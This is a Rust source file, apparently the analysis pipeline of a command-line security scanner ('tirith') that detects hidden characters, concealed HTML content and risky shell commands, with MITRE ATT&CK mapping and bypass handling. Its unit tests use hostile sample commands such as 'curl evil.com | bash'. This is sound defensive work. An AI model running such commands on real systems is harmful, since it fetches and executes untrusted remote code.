use std::time::Instant;

use crate::extract::{self, ScanContext};
use crate::normalize;
use crate::policy::Policy;
use crate::tokenize::ShellType;
use crate::verdict::{Finding, Timings, Verdict};

/// Extract the raw path from a URL string before any normalization.
fn extract_raw_path_from_url(raw: &str) -> Option<String> {
    if let Some(idx) = raw.find("://") {
        let after = &raw[idx + 3..];
        if let Some(slash_idx) = after.find('/') {
            // Find end of path (before ? or #)
            let path_start = &after[slash_idx..];
            let end = path_start.find(['?', '#']).unwrap_or(path_start.len());
            return Some(path_start[..end].to_string());
        }
    }
    None
}

/// Analysis context passed through the pipeline.
pub struct AnalysisContext {
    pub input: String,
    pub shell: ShellType,
    pub scan_context: ScanContext,
    pub raw_bytes: Option<Vec<u8>>,
    pub interactive: bool,
    pub cwd: Option<String>,
    /// File path being scanned (only populated for ScanContext::FileScan).
    pub file_path: Option<std::path::PathBuf>,
    /// Clipboard HTML content for rich-text paste analysis.
    /// Only populated when `tirith paste --html <path>` is used.
    pub clipboard_html: Option<String>,
}

/// Check if the input contains an inline `TIRITH=0` bypass prefix.
/// Handles bare prefix (`TIRITH=0 cmd`) and env wrappers (`env -i TIRITH=0 cmd`).
fn find_inline_bypass(input: &str, _shell: ShellType) -> bool {
    use crate::tokenize;

    let words = split_raw_words(input);
    if words.is_empty() {
        return false;
    }

    // Case 1: Leading VAR=VALUE assignments before the command
    let mut idx = 0;
    while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
        if words[idx].starts_with("TIRITH=0") || words[idx] == "TIRITH=0" {
            return true;
        }
        idx += 1;
    }

    // Case 2: First real word is `env` — parse env-style args
    if idx < words.len() {
        let cmd = words[idx].rsplit('/').next().unwrap_or(&words[idx]);
        if cmd == "env" {
            idx += 1;
            while idx < words.len() {
                let w = &words[idx];
                if w == "--" {
                    idx += 1;
                    // After --, remaining are VAR=VALUE or command
                    break;
                }
                if tokenize::is_env_assignment(w) {
                    if w.starts_with("TIRITH=0") || w == "TIRITH=0" {
                        return true;
                    }
                    idx += 1;
                    continue;
                }
                if w.starts_with('-') {
                    // -u takes a value arg
                    if w == "-u" {
                        idx += 2; // skip -u and its value
                        continue;
                    }
                    idx += 1;
                    continue;
                }
                // Non-flag, non-assignment = the command, stop
                break;
            }
            // Check remaining words after -- for TIRITH=0
            while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
                if words[idx].starts_with("TIRITH=0") || words[idx] == "TIRITH=0" {
                    return true;
                }
                idx += 1;
            }
        }
    }

    false
}

/// Split input into raw words respecting quotes (for bypass/self-invocation parsing).
/// Unlike tokenize(), this doesn't split on pipes/semicolons — just whitespace-splits
/// the raw input to inspect the first segment's words.
fn split_raw_words(input: &str) -> Vec<String> {
    // Take only up to the first unquoted pipe/semicolon/&&/||
    let mut words = Vec::new();
    let mut current = String::new();
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut i = 0;

    while i < len {
        let ch = chars[i];
        match ch {
            ' ' | '\t' if !current.is_empty() => {
                words.push(current.clone());
                current.clear();
                i += 1;
                while i < len && (chars[i] == ' ' || chars[i] == '\t') {
                    i += 1;
                }
            }
            ' ' | '\t' => {
                i += 1;
            }
            '|' | ';' | '\n' => break, // Stop at segment boundary
            '&' if i + 1 < len && chars[i + 1] == '&' => break,
            '\'' => {
                current.push(ch);
                i += 1;
                while i < len && chars[i] != '\'' {
                    current.push(chars[i]);
                    i += 1;
                }
                if i < len {
                    current.push(chars[i]);
                    i += 1;
                }
            }
            '"' => {
                current.push(ch);
                i += 1;
                while i < len && chars[i] != '"' {
                    if chars[i] == '\\' && i + 1 < len {
                        current.push(chars[i]);
                        current.push(chars[i + 1]);
                        i += 2;
                    } else {
                        current.push(chars[i]);
                        i += 1;
                    }
                }
                if i < len {
                    current.push(chars[i]);
                    i += 1;
                }
            }
            '\\' if i + 1 < len => {
                current.push(chars[i]);
                current.push(chars[i + 1]);
                i += 2;
            }
            _ => {
                current.push(ch);
                i += 1;
            }
        }
    }
    if !current.is_empty() {
        words.push(current);
    }
    words
}

/// Check if the input is a self-invocation of tirith (single-segment only).
/// Returns true if the resolved command is `tirith` itself.
fn is_self_invocation(input: &str, shell: ShellType) -> bool {
    use crate::tokenize;

    // Must be single segment (no pipes, &&, etc.)
    let segments = tokenize::tokenize(input, shell);
    if segments.len() != 1 {
        return false;
    }

    let words = split_raw_words(input);
    if words.is_empty() {
        return false;
    }

    // Skip leading VAR=VALUE
    let mut idx = 0;
    while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
        idx += 1;
    }
    if idx >= words.len() {
        return false;
    }

    let cmd = &words[idx];
    let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd);

    // Try to resolve wrappers (one level)
    let resolved = match cmd_base {
        "env" => resolve_env_wrapper(&words[idx + 1..]),
        "command" => resolve_command_wrapper(&words[idx + 1..]),
        "time" => resolve_time_wrapper(&words[idx + 1..]),
        other => Some(other.to_string()),
    };

    match resolved {
        Some(ref cmd_name) => is_tirith_command(cmd_name),
        None => false,
    }
}

/// Resolve through `env` wrapper: skip options, VAR=VALUE, find command.
fn resolve_env_wrapper(args: &[String]) -> Option<String> {
    use crate::tokenize;
    let mut i = 0;
    while i < args.len() {
        let w = &args[i];
        if w == "--" {
            i += 1;
            break;
        }
        if tokenize::is_env_assignment(w) {
            i += 1;
            continue;
        }
        if w.starts_with('-') {
            if w == "-u" {
                i += 2; // skip -u and its value
                continue;
            }
            i += 1;
            continue;
        }
        // First non-option, non-assignment is the command
        return Some(w.rsplit('/').next().unwrap_or(w).to_string());
    }
    // After --, skip remaining VAR=VALUE to find command
    while i < args.len() {
        let w = &args[i];
        if tokenize::is_env_assignment(w) {
            i += 1;
            continue;
        }
        return Some(w.rsplit('/').next().unwrap_or(w).to_string());
    }
    None
}

/// Resolve through `command` wrapper: skip `--`, take next arg.
fn resolve_command_wrapper(args: &[String]) -> Option<String> {
    let mut i = 0;
    // Skip -- if present
    if i < args.len() && args[i] == "--" {
        i += 1;
    }
    if i < args.len() {
        let w = &args[i];
        Some(w.rsplit('/').next().unwrap_or(w).to_string())
    } else {
        None
    }
}

/// Resolve through `time` wrapper: skip -prefixed flags, take next non-flag.
fn resolve_time_wrapper(args: &[String]) -> Option<String> {
    for w in args {
        if w.starts_with('-') {
            continue;
        }
        return Some(w.rsplit('/').next().unwrap_or(w).to_string());
    }
    None
}

/// Check if a command name is tirith (literal or path match).
fn is_tirith_command(cmd: &str) -> bool {
    if cmd == "tirith" {
        return true;
    }
    // Path form: try canonicalize and compare to current_exe
    if cmd.contains('/') {
        let cmd_path = std::path::Path::new(cmd);
        if let Ok(canonical_cmd) = cmd_path.canonicalize() {
            if let Ok(current) = std::env::current_exe() {
                if let Ok(canonical_current) = current.canonicalize() {
                    return canonical_cmd == canonical_current;
                }
            }
        }
        // Canonicalization failed — don't auto-allow, return false
        return false;
    }
    false
}

/// Run the tiered analysis pipeline.
pub fn analyze(ctx: &AnalysisContext) -> Verdict {
    let start = Instant::now();

    // Tier 0: Check bypass flag
    let tier0_start = Instant::now();
    let bypass_env = std::env::var("TIRITH").ok().as_deref() == Some("0");
    let bypass_inline = find_inline_bypass(&ctx.input, ctx.shell);
    let bypass_requested = bypass_env || bypass_inline;
    let tier0_ms = tier0_start.elapsed().as_secs_f64() * 1000.0;

    // Tier 1: Fast scan (no I/O)
    let tier1_start = Instant::now();

    // Step 1 (paste only): byte-level scan for control chars
    let byte_scan_triggered = if ctx.scan_context == ScanContext::Paste {
        if let Some(ref bytes) = ctx.raw_bytes {
            let scan = extract::scan_bytes(bytes);
            scan.has_ansi_escapes
                || scan.has_control_chars
                || scan.has_bidi_controls
                || scan.has_zero_width
                || scan.has_invalid_utf8
                || scan.has_unicode_tags
                || scan.has_variation_selectors
                || scan.has_invisible_math_operators
                || scan.has_invisible_whitespace
        } else {
            false
        }
    } else {
        false
    };

    // Step 2: URL-like regex scan
    let regex_triggered = extract::tier1_scan(&ctx.input, ctx.scan_context);

    // Step 3 (exec only): check for bidi/zero-width/invisible chars even without URLs
    let exec_bidi_triggered = if ctx.scan_context == ScanContext::Exec {
        let scan = extract::scan_bytes(ctx.input.as_bytes());
        scan.has_bidi_controls
            || scan.has_zero_width
            || scan.has_unicode_tags
            || scan.has_variation_selectors
            || scan.has_invisible_math_operators
            || scan.has_invisible_whitespace
    } else {
        false
    };

    let tier1_ms = tier1_start.elapsed().as_secs_f64() * 1000.0;

    // If nothing triggered, fast exit
    if !byte_scan_triggered && !regex_triggered && !exec_bidi_triggered {
        let total_ms = start.elapsed().as_secs_f64() * 1000.0;
        return Verdict::allow_fast(
            1,
            Timings {
                tier0_ms,
                tier1_ms,
                tier2_ms: None,
                tier3_ms: None,
                total_ms,
            },
        );
    }

    // Self-invocation guard: allow tirith's own commands (single-segment only)
    if ctx.scan_context == ScanContext::Exec && is_self_invocation(&ctx.input, ctx.shell) {
        let total_ms = start.elapsed().as_secs_f64() * 1000.0;
        return Verdict::allow_fast(
            1,
            Timings {
                tier0_ms,
                tier1_ms,
                tier2_ms: None,
                tier3_ms: None,
                total_ms,
            },
        );
    }

    // Tier 2: Policy + data loading (deferred I/O)
    let tier2_start = Instant::now();

    if bypass_requested {
        // Load partial policy to check bypass settings
        let policy = Policy::discover_partial(ctx.cwd.as_deref());
        let allow_bypass = if ctx.interactive {
            policy.allow_bypass_env
        } else {
            policy.allow_bypass_env_noninteractive
        };

        if allow_bypass {
            let tier2_ms = tier2_start.elapsed().as_secs_f64() * 1000.0;
            let total_ms = start.elapsed().as_secs_f64() * 1000.0;
            let mut verdict = Verdict::allow_fast(
                2,
                Timings {
                    tier0_ms,
                    tier1_ms,
                    tier2_ms: Some(tier2_ms),
                    tier3_ms: None,
                    total_ms,
                },
            );
            verdict.bypass_requested = true;
            verdict.bypass_honored = true;
            verdict.interactive_detected = ctx.interactive;
            verdict.policy_path_used = policy.path.clone();
            // Log bypass to audit
            crate::audit::log_verdict(&verdict, &ctx.input, None, None, &[]);
            return verdict;
        }
    }

    let mut policy = Policy::discover(ctx.cwd.as_deref());
    policy.load_user_lists();
    policy.load_org_lists(ctx.cwd.as_deref());
    let tier2_ms = tier2_start.elapsed().as_secs_f64() * 1000.0;

    // Tier 3: Full analysis
    let tier3_start = Instant::now();
    let mut findings = Vec::new();

    // Track extracted URLs for allowlist/blocklist (Exec/Paste only)
    let mut extracted = Vec::new();

    if ctx.scan_context == ScanContext::FileScan {
        // FileScan: byte scan + configfile rules ONLY.
        // Does NOT run command/env/URL-extraction rules.
        let byte_input = if let Some(ref bytes) = ctx.raw_bytes {
            bytes.as_slice()
        } else {
            ctx.input.as_bytes()
        };
        let byte_findings = crate::rules::terminal::check_bytes(byte_input);
        findings.extend(byte_findings);

        // Config file detection rules
        findings.extend(crate::rules::configfile::check(
            &ctx.input,
            ctx.file_path.as_deref(),
        ));

        // Rendered content rules (file-type gated)
        if crate::rules::rendered::is_renderable_file(ctx.file_path.as_deref()) {
            // PDF files get their own parser
            let is_pdf = ctx
                .file_path
                .as_deref()
                .and_then(|p| p.extension())
                .and_then(|e| e.to_str())
                .map(|e| e.eq_ignore_ascii_case("pdf"))
                .unwrap_or(false);

            if is_pdf {
                let pdf_bytes = ctx.raw_bytes.as_deref().unwrap_or(ctx.input.as_bytes());
                findings.extend(crate::rules::rendered::check_pdf(pdf_bytes));
            } else {
                findings.extend(crate::rules::rendered::check(
                    &ctx.input,
                    ctx.file_path.as_deref(),
                ));
            }
        }
    } else {
        // Exec/Paste: standard pipeline

        // Run byte-level rules for paste context
        if ctx.scan_context == ScanContext::Paste {
            if let Some(ref bytes) = ctx.raw_bytes {
                let byte_findings = crate::rules::terminal::check_bytes(bytes);
                findings.extend(byte_findings);
            }
            // Check for hidden multiline content in pasted text
            let multiline_findings = crate::rules::terminal::check_hidden_multiline(&ctx.input);
            findings.extend(multiline_findings);

            // Check clipboard HTML for hidden content (rich-text paste analysis)
            if let Some(ref html) = ctx.clipboard_html {
                let clipboard_findings =
                    crate::rules::terminal::check_clipboard_html(html, &ctx.input);
                findings.extend(clipboard_findings);
            }
        }

        // Invisible character checks apply to both exec and paste contexts
        if ctx.scan_context == ScanContext::Exec {
            let byte_input = ctx.input.as_bytes();
            let scan = extract::scan_bytes(byte_input);
            if scan.has_bidi_controls
                || scan.has_zero_width
                || scan.has_unicode_tags
                || scan.has_variation_selectors
                || scan.has_invisible_math_operators
                || scan.has_invisible_whitespace
            {
                let byte_findings = crate::rules::terminal::check_bytes(byte_input);
                // Only keep invisible-char findings for exec context
                findings.extend(byte_findings.into_iter().filter(|f| {
                    matches!(
                        f.rule_id,
                        crate::verdict::RuleId::BidiControls
                            | crate::verdict::RuleId::ZeroWidthChars
                            | crate::verdict::RuleId::UnicodeTags
                            | crate::verdict::RuleId::InvisibleMathOperator
                            | crate::verdict::RuleId::VariationSelector
                            | crate::verdict::RuleId::InvisibleWhitespace
                    )
                }));
            }
        }

        // Extract and analyze URLs
        extracted = extract::extract_urls(&ctx.input, ctx.shell);

        for url_info in &extracted {
            // Normalize path if available — use raw extracted URL's path for non-ASCII detection
            // since url::Url percent-encodes non-ASCII during parsing
            let raw_path = extract_raw_path_from_url(&url_info.raw);
            let normalized_path = url_info.parsed.path().map(normalize::normalize_path);

            // Run all rule categories
            let hostname_findings = crate::rules::hostname::check(&url_info.parsed, &policy);
            findings.extend(hostname_findings);

            let path_findings = crate::rules::path::check(
                &url_info.parsed,
                normalized_path.as_ref(),
                raw_path.as_deref(),
            );
            findings.extend(path_findings);

            let transport_findings =
                crate::rules::transport::check(&url_info.parsed, url_info.in_sink_context);
            findings.extend(transport_findings);

            let ecosystem_findings = crate::rules::ecosystem::check(&url_info.parsed);
            findings.extend(ecosystem_findings);
        }

        // Run command-shape rules on full input
        let command_findings = crate::rules::command::check(&ctx.input, ctx.shell);
        findings.extend(command_findings);

        // Run environment rules
        let env_findings = crate::rules::environment::check(&crate::rules::environment::RealEnv);
        findings.extend(env_findings);

        // Policy-driven network deny/allow (Team feature)
        if crate::license::current_tier() >= crate::license::Tier::Team
            && !policy.network_deny.is_empty()
        {
            let net_findings = crate::rules::command::check_network_policy(
                &ctx.input,
                ctx.shell,
                &policy.network_deny,
                &policy.network_allow,
            );
            findings.extend(net_findings);
        }
    }

    // Custom YAML detection rules (Team-only, Phase 24)
    if crate::license::current_tier() >= crate::license::Tier::Team
        && !policy.custom_rules.is_empty()
    {
        let compiled = crate::rules::custom::compile_rules(&policy.custom_rules);
        let custom_findings = crate::rules::custom::check(&ctx.input, ctx.scan_context, &compiled);
        findings.extend(custom_findings);
    }

    // Apply policy severity overrides
    for finding in &mut findings {
        if let Some(override_sev) = policy.severity_override(&finding.rule_id) {
            finding.severity = override_sev;
        }
    }

    // Filter by allowlist/blocklist
    // Blocklist: if any extracted URL matches blocklist, escalate to Block
    for url_info in &extracted {
        if policy.is_blocklisted(&url_info.raw) {
            findings.push(Finding {
                rule_id: crate::verdict::RuleId::PolicyBlocklisted,
                severity: crate::verdict::Severity::Critical,
                title: "URL matches blocklist".to_string(),
                description: format!("URL '{}' matches a blocklist pattern", url_info.raw),
                evidence: vec![crate::verdict::Evidence::Url {
                    raw: url_info.raw.clone(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    // Allowlist: remove findings for URLs that match allowlist
    // (blocklist takes precedence — if blocklisted, findings remain)
    if !policy.allowlist.is_empty() {
        let blocklisted_urls: Vec<String> = extracted
            .iter()
            .filter(|u| policy.is_blocklisted(&u.raw))
            .map(|u| u.raw.clone())
            .collect();

        findings.retain(|f| {
            // Keep all findings that aren't URL-based
            let url_in_evidence = f.evidence.iter().find_map(|e| {
                if let crate::verdict::Evidence::Url { raw } = e {
                    Some(raw.clone())
                } else {
                    None
                }
            });
            match url_in_evidence {
                Some(ref url) => {
                    // Keep if blocklisted, otherwise drop if allowlisted
                    blocklisted_urls.contains(url) || !policy.is_allowlisted(url)
                }
                None => true, // Keep non-URL findings
            }
        });
    }

    // Enrichment pass (ADR-13): detection is free, enrichment is paid.
    // All detection rules have already run above. Now add tier-gated enrichment.
    let tier = crate::license::current_tier();
    if tier >= crate::license::Tier::Pro {
        enrich_pro(&mut findings);
    }
    if tier >= crate::license::Tier::Team {
        enrich_team(&mut findings);
    }

    // Early access filter (ADR-14): suppress non-critical findings for rules
    // in time-boxed early access windows when tier is below the minimum.
    crate::rule_metadata::filter_early_access(&mut findings, tier);

    let tier3_ms = tier3_start.elapsed().as_secs_f64() * 1000.0;
    let total_ms = start.elapsed().as_secs_f64() * 1000.0;

    let mut verdict = Verdict::from_findings(
        findings,
        3,
        Timings {
            tier0_ms,
            tier1_ms,
            tier2_ms: Some(tier2_ms),
            tier3_ms: Some(tier3_ms),
            total_ms,
        },
    );
    verdict.bypass_requested = bypass_requested;
    verdict.interactive_detected = ctx.interactive;
    verdict.policy_path_used = policy.path.clone();
    verdict.urls_extracted_count = Some(extracted.len());

    verdict
}

// ---------------------------------------------------------------------------
// Paranoia tier filtering (Phase 15)
// ---------------------------------------------------------------------------

/// Filter a verdict's findings by paranoia level and license tier.
///
/// This is an output-layer filter — the engine always detects everything (ADR-13).
/// CLI/MCP call this after `analyze()` to reduce noise at lower paranoia levels.
///
/// - Paranoia 1-2 (any tier): Medium+ findings only
/// - Paranoia 3 (Pro required): also show Low findings
/// - Paranoia 4 (Pro required): also show Info findings
///
/// Free-tier users are capped at effective paranoia 2 regardless of policy setting.
pub fn filter_findings_by_paranoia(verdict: &mut Verdict, paranoia: u8) {
    let tier = crate::license::current_tier();
    let effective = if tier >= crate::license::Tier::Pro {
        paranoia.min(4)
    } else {
        paranoia.min(2) // Free users capped at 2
    };

    verdict.findings.retain(|f| match f.severity {
        crate::verdict::Severity::Info => effective >= 4,
        crate::verdict::Severity::Low => effective >= 3,
        _ => true, // Medium/High/Critical always shown
    });
}

/// Filter a Vec<Finding> by paranoia level and license tier.
/// Same logic as `filter_findings_by_paranoia` but operates on raw findings
/// (for scan results that don't use the Verdict wrapper).
pub fn filter_findings_by_paranoia_vec(findings: &mut Vec<Finding>, paranoia: u8) {
    let tier = crate::license::current_tier();
    let effective = if tier >= crate::license::Tier::Pro {
        paranoia.min(4)
    } else {
        paranoia.min(2)
    };

    findings.retain(|f| match f.severity {
        crate::verdict::Severity::Info => effective >= 4,
        crate::verdict::Severity::Low => effective >= 3,
        _ => true,
    });
}

// ---------------------------------------------------------------------------
// Tier-gated enrichment (ADR-13: detect free, enrich paid)
// ---------------------------------------------------------------------------

/// Pro enrichment: dual-view, decoded content, cloaking diffs, line numbers.
fn enrich_pro(findings: &mut [Finding]) {
    for finding in findings.iter_mut() {
        match finding.rule_id {
            // Rendered content findings: show what human sees vs what agent processes
            crate::verdict::RuleId::HiddenCssContent => {
                finding.human_view =
                    Some("Content hidden via CSS — invisible in rendered view".into());
                finding.agent_view = Some(format!(
                    "AI agent sees full text including CSS-hidden content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::HiddenColorContent => {
                finding.human_view =
                    Some("Text blends with background — invisible to human eye".into());
                finding.agent_view = Some(format!(
                    "AI agent reads text regardless of color contrast. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::HiddenHtmlAttribute => {
                finding.human_view =
                    Some("Elements marked hidden/aria-hidden — not displayed".into());
                finding.agent_view = Some(format!(
                    "AI agent processes hidden element content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::HtmlComment => {
                finding.human_view = Some("HTML comments not rendered in browser".into());
                finding.agent_view = Some(format!(
                    "AI agent reads comment content as context. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::MarkdownComment => {
                finding.human_view = Some("Markdown comments not rendered in preview".into());
                finding.agent_view = Some(format!(
                    "AI agent processes markdown comment content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::PdfHiddenText => {
                finding.human_view = Some("Sub-pixel text invisible in PDF viewer".into());
                finding.agent_view = Some(format!(
                    "AI agent extracts all text including sub-pixel content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::ClipboardHidden => {
                finding.human_view =
                    Some("Hidden content in clipboard HTML not visible in paste preview".into());
                finding.agent_view = Some(format!(
                    "AI agent processes full clipboard including hidden HTML. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            _ => {}
        }
    }
}

/// Summarize evidence entries for enrichment text.
fn evidence_summary(evidence: &[crate::verdict::Evidence]) -> String {
    let details: Vec<&str> = evidence
        .iter()
        .filter_map(|e| {
            if let crate::verdict::Evidence::Text { detail } = e {
                Some(detail.as_str())
            } else {
                None
            }
        })
        .take(3)
        .collect();
    if details.is_empty() {
        String::new()
    } else {
        format!("Details: {}", details.join("; "))
    }
}

/// MITRE ATT&CK technique mapping for built-in rules.
fn mitre_id_for_rule(rule_id: crate::verdict::RuleId) -> Option<&'static str> {
    use crate::verdict::RuleId;
    match rule_id {
        // Execution
        RuleId::PipeToInterpreter
        | RuleId::CurlPipeShell
        | RuleId::WgetPipeShell
        | RuleId::HttpiePipeShell
        | RuleId::XhPipeShell => Some("T1059.004"), // Command and Scripting Interpreter: Unix Shell

        // Persistence
        RuleId::DotfileOverwrite => Some("T1546.004"), // Event Triggered Execution: Unix Shell Config

        // Defense Evasion
        RuleId::BidiControls | RuleId::UnicodeTags | RuleId::ZeroWidthChars => {
            Some("T1036.005") // Masquerading: Match Legitimate Name or Location
        }
        RuleId::HiddenMultiline | RuleId::AnsiEscapes | RuleId::ControlChars => Some("T1036.005"),

        // Hijack Execution Flow
        RuleId::CodeInjectionEnv => Some("T1574.006"), // Hijack Execution Flow: Dynamic Linker Hijacking
        RuleId::InterpreterHijackEnv => Some("T1574.007"), // Path Interception by PATH
        RuleId::ShellInjectionEnv => Some("T1546.004"), // Shell Config Modification

        // Credential Access
        RuleId::MetadataEndpoint => Some("T1552.005"), // Unsecured Credentials: Cloud Instance Metadata
        RuleId::SensitiveEnvExport => Some("T1552.001"), // Credentials In Files

        // Supply Chain
        RuleId::ConfigInjection => Some("T1195.001"), // Supply Chain Compromise: Dev Tools
        RuleId::McpInsecureServer | RuleId::McpSuspiciousArgs => Some("T1195.002"), // Compromise Software Supply Chain
        RuleId::GitTyposquat => Some("T1195.001"),
        RuleId::DockerUntrustedRegistry => Some("T1195.002"),

        // Discovery / Lateral Movement
        RuleId::PrivateNetworkAccess => Some("T1046"), // Network Service Discovery
        RuleId::ServerCloaking => Some("T1036"),       // Masquerading

        // Collection
        RuleId::ArchiveExtract => Some("T1560.001"), // Archive Collected Data: Archive via Utility

        // Exfiltration
        RuleId::ProxyEnvSet => Some("T1090.001"), // Proxy: Internal Proxy

        _ => None,
    }
}

/// Team enrichment: MITRE ATT&CK classification.
fn enrich_team(findings: &mut [Finding]) {
    for finding in findings.iter_mut() {
        if finding.mitre_id.is_none() {
            finding.mitre_id = mitre_id_for_rule(finding.rule_id).map(String::from);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_exec_bidi_without_url() {
        // Input with bidi control but no URL — should NOT fast-exit at tier 1
        let input = format!("echo hello{}world", '\u{202E}');
        let ctx = AnalysisContext {
            input,
            shell: ShellType::Posix,
            scan_context: ScanContext::Exec,
            raw_bytes: None,
            interactive: true,
            cwd: None,
            file_path: None,
            clipboard_html: None,
        };
        let verdict = analyze(&ctx);
        // Should reach tier 3 (not fast-exit at tier 1)
        assert!(
            verdict.tier_reached >= 3,
            "bidi in exec should reach tier 3, got tier {}",
            verdict.tier_reached
        );
        // Should have findings about bidi
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::BidiControls)),
            "should detect bidi controls in exec context"
        );
    }

    #[test]
    fn test_paranoia_filter_suppresses_info_low() {
        use crate::verdict::{Finding, RuleId, Severity, Timings, Verdict};

        let findings = vec![
            Finding {
                rule_id: RuleId::VariationSelector,
                severity: Severity::Info,
                title: "info finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
            Finding {
                rule_id: RuleId::InvisibleWhitespace,
                severity: Severity::Low,
                title: "low finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
            Finding {
                rule_id: RuleId::HiddenCssContent,
                severity: Severity::High,
                title: "high finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
        ];

        let timings = Timings {
            tier0_ms: 0.0,
            tier1_ms: 0.0,
            tier2_ms: None,
            tier3_ms: None,
            total_ms: 0.0,
        };

        // Default paranoia (1): only Medium+ shown
        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
        filter_findings_by_paranoia(&mut verdict, 1);
        assert_eq!(
            verdict.findings.len(),
            1,
            "paranoia 1 should keep only High+"
        );
        assert_eq!(verdict.findings[0].severity, Severity::High);

        // Paranoia 2: still only Medium+ (free tier cap)
        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
        filter_findings_by_paranoia(&mut verdict, 2);
        assert_eq!(
            verdict.findings.len(),
            1,
            "paranoia 2 should keep only Medium+"
        );
    }

    #[test]
    fn test_inline_bypass_bare_prefix() {
        assert!(find_inline_bypass(
            "TIRITH=0 curl evil.com | bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_wrapper() {
        assert!(find_inline_bypass(
            "env TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_i() {
        assert!(find_inline_bypass(
            "env -i TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_u_skip() {
        assert!(find_inline_bypass(
            "env -u TIRITH TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_usr_bin_env() {
        assert!(find_inline_bypass(
            "/usr/bin/env TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_dashdash() {
        assert!(find_inline_bypass(
            "env -- TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_no_inline_bypass() {
        assert!(!find_inline_bypass(
            "curl evil.com | bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_self_invocation_simple() {
        assert!(is_self_invocation(
            "tirith diff https://example.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_self_invocation_env_wrapper() {
        assert!(is_self_invocation(
            "env -u PATH tirith diff url",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_self_invocation_command_dashdash() {
        assert!(is_self_invocation(
            "command -- tirith diff url",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_self_invocation_time_p() {
        assert!(is_self_invocation(
            "time -p tirith diff url",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_not_self_invocation_multi_segment() {
        assert!(!is_self_invocation(
            "tirith diff url | bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_not_self_invocation_other_cmd() {
        assert!(!is_self_invocation(
            "curl https://evil.com",
            ShellType::Posix
        ));
    }
}
